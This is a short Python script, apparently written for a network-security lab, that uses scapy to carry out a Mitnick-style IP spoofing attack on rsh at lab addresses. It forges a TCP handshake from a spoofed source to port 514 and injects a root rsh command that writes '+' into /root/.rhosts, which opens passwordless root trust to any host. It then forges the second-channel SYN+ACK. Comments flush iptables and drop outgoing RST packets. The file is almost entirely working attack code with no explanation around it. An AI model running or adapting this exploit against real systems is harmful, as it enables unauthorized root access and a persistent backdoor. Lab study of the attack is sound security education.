#!/usr/bin/python3

import scapy.all as scapy
import subprocess
from arpspoof import get_iface

#iptables -F
#iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP && apt update && apt install ufw -y
#hostname -I | awk '{print $1}'

subprocess.run(args="arp -s 10.9.0.6 ff:ff:ff:ff:ff:aa", shell=True)

print("-----------------Manda pacote SYN-----------------")
pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1023, dport=514, flags='S', seq=1234)
rcvd = scapy.sr1(pkt, iface=get_iface(), verbose=False)

print("-----------------Manda pacote ACK-----------------")
pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1023, dport=514, flags='A', seq=1235, ack=rcvd.seq + 1)
scapy.send(pkt, verbose=False)

## CONEXAO ABERTA!!!!
print("-----------------Manda pacote RSH-----------------")
data = '1022\x00root\x00root\x00echo "+" > /root/.rhosts\x00'
pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1023, dport=514, flags='A', seq=1235, ack=rcvd.seq + 1) / scapy.Raw(load=data)
scapy.send(pkt, verbose=False)

rcvd = scapy.sniff(count=1, iface=get_iface(), filter="tcp and src host 10.9.0.5")

print("-----------------Manda pacote SYN+ACK na segunda porta-----------------")
pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1022, dport=1023, flags='SA', seq=123, ack=rcvd[0].seq + 1)
scapy.send(pkt, verbose=False)